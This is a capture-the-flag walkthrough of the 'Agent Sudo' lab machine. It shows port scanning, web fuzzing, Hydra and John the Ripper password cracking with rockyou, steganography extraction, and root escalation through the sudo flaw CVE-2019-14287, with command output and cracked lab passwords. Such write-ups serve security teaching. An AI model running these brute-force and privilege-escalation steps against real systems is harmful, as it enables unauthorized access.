A CTF type room.

Starting with the machine enumeration.

```
┌──(kali㉿kali)-[~/Desktop/THM/Agent Sudo]
└─$ sudo nmap -sS 10.10.122.143 > open_ports.txt          
[sudo] password for kali: 
                                                                                                                                                 
┌──(kali㉿kali)-[~/Desktop/THM/Agent Sudo]
└─$ cat open_ports.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-01 21:06 IST
Nmap scan report for 10.10.122.143
Host is up (0.66s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 9.34 seconds
```

```
┌──(kali㉿kali)-[~/Desktop/THM/Agent Sudo]
└─$ sudo nmap -sS -sV -sC -O -Pn -p21,22,80 10.10.122.143 > ports_scan.txt
                                                                                                                                                 
┌──(kali㉿kali)-[~/Desktop/THM/Agent Sudo]
└─$ cat ports_scan.txt 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-01 21:07 IST
Nmap scan report for 10.10.122.143
Host is up (0.50s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 5.4 (97%), Linux 3.10 - 3.13 (96%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.1 (95%), Linux 3.16 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.48 seconds
```

FTP, SSH and HTTP ports are open. The FTP port doesn't allow anonymous login, and fuzzing the website, doesn't give anything.

```
┌──(kali㉿kali)-[~/Desktop/THM/Agent Sudo]
└─$ ffuf -u http://10.10.122.143/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.122.143/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 482ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 3837ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 480ms]
:: Progress: [20476/20476] :: Job [1/1] :: 73 req/sec :: Duration: [0:04:33] :: Errors: 0 ::x
```

The website gives the hint to play with the User-Agent.
<img src=https://github.com/user-attachments/assets/0fcf660d-bfac-4b3e-8cc3-427526f1e07d>

Intercepting it with Burp Suite, I manually tried with `A, B, C, etc`. This can also be automated with Burp's Intruder feature.

This is with User-Agent as C:
<img src=https://github.com/user-attachments/assets/3b490f2d-dd18-41f8-ab54-da718ab7f0ba>

Now I know the username for the FTP server. The password is weak so I used Hydra to find the password using rockyou.txt file.

```
┌──(kali㉿kali)-[~/Desktop/THM/Agent Sudo]
└─$ hydra ftp://10.10.122.143 -l chris -P /usr/share/wordlists/rockyou.txt                            
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-01 21:34:10
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.122.143:21/
[STATUS] 224.00 tries/min, 224 tries in 00:01h, 14344175 to do in 1067:17h, 16 active
[21][ftp] host: 10.10.122.143   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-01 21:35:25
```

Logging to the FTP server.
```
ftp> ls -la
229 Entering Extended Passive Mode (|||14533|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Oct 29  2019 .
drwxr-xr-x    2 0        0            4096 Oct 29  2019 ..
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
```

I copied all the images and the text file to my machine. The two images are images of aliens, as mentioned in the name. The text file is interesting.

```
┌──(kali㉿kali)-[~/Desktop/THM/Agent Sudo]
└─$ cat To_agentJ.txt 
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

As far as I know, steghide works with JPG files. And upon doing that, it is asking for a passphrase, which I don't know as of now. I tried to unzip the png files.

```
┌──(kali㉿kali)-[~/Desktop/THM/Agent Sudo]
└─$ unzip cutie.png     
Archive:  cutie.png
warning [cutie.png]:  34562 extra bytes at beginning or within zipfile
  (attempting to process anyway)
   skipping: To_agentR.txt           need PK compat. v5.1 (can do v4.6)


┌──(kali㉿kali)-[~/Desktop/THM/Agent Sudo/_cutie.png.extracted]
└─$ 7z e 8702.zip 

7-Zip 24.08 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-08-11
 64-bit locale=en_US.UTF-8 Threads:32 OPEN_MAX:1024

Scanning the drive for archives:
1 file, 280 bytes (1 KiB)

Extracting archive: 8702.zip
--
Path = 8702.zip
Type = zip
Physical Size = 280

    
Enter password (will not be echoed):
```

unzip and 7z fails, 7z requiring password. Then I tried `binwalk`, a tool for searching a given binary image for embedded files and executable code.

```
┌──(kali㉿kali)-[~/Desktop/THM/Agent Sudo]
└─$ binwalk -e cutie.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```

```
┌──(kali㉿kali)-[~/Desktop/THM/Agent Sudo]
└─$ cd _cutie.png.extracted 
                                                                                                                                                 
┌──(kali㉿kali)-[~/Desktop/THM/Agent Sudo/_cutie.png.extracted]
└─$ ls
365  365.zlib  8702.zip
```

The extracted files. Then, use zip2john to get the john readable file.

```
┌──(kali㉿kali)-[~/Desktop/THM/Agent Sudo/_cutie.png.extracted]
└─$ zip2john 8702.zip > zip2john.txt
                                                                                                                                                 
┌──(kali㉿kali)-[~/Desktop/THM/Agent Sudo/_cutie.png.extracted]
└─$ john zip2john.txt --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 AVX 4x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alien            (8702.zip/To_agentR.txt)     
1g 0:00:00:00 DONE (2024-10-01 21:47) 1.724g/s 42372p/s 42372c/s 42372C/s michael!..280789
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

This is the password for extracting the files using 7z.

```
┌──(kali㉿kali)-[~/Desktop/THM/Agent Sudo/_cutie.png.extracted]
└─$ 7z e 8702.zip

7-Zip 24.08 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-08-11
 64-bit locale=en_US.UTF-8 Threads:32 OPEN_MAX:1024

Scanning the drive for archives:
1 file, 280 bytes (1 KiB)

Extracting archive: 8702.zip
--
Path = 8702.zip
Type = zip
Physical Size = 280

Enter password (will not be echoed):
Everything is Ok

Size:       86
Compressed: 280
```

```
┌──(kali㉿kali)-[~/Desktop/THM/Agent Sudo/_cutie.png.extracted]
└─$ ls
365  365.zlib  8702.zip  To_agentR.txt
```

Reading the text file.
```
┌──(kali㉿kali)-[~/Desktop/THM/Agent Sudo/_cutie.png.extracted]
└─$ cat To_agentR.txt      
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

<img src=https://github.com/user-attachments/assets/153546fb-095b-4166-bda1-c65aec256028>

This is the passphrase/password for the stenography JPG file.

```
┌──(kali㉿kali)-[~/Desktop/THM/Agent Sudo]
└─$ steghide extract -sf cute-alien.jpg
Enter passphrase: 
wrote extracted data to "message.txt"

┌──(kali㉿kali)-[~/Desktop/THM/Agent Sudo]
└─$ cat message.txt   
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

We now have James's password for SSH. I logged in to the account. The good thing is that the SSH password and the user's password are the same.

```
james@agent-sudo:~$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

 I tried the command `sudo /bin/bash`

```
james@agent-sudo:~$ sudo /bin/bash
Sorry, user james is not allowed to execute '/bin/bash' as root on agent-sudo.
```

I searched the (ALL, !root) on Google and got CVE-2019-14287, which is to be used for privilege escalation.

`The sudo vulnerability CVE-2019-14287 is a security policy bypass issue that provides a user or a program the ability to execute commands as root on a Linux system when the 
“sudoers configuration” explicitly disallows the root access`

Using the exploit to gain the the root shell.

```
james@agent-sudo:/tmp$ python3 exploit.py 
Enter current username :james
Lets hope it works
root@agent-sudo:/tmp# whoami
root
root@agent-sudo:/tmp# id
uid=0(root) gid=1000(james) groups=1000(james)
root@agent-sudo:/tmp# 
```
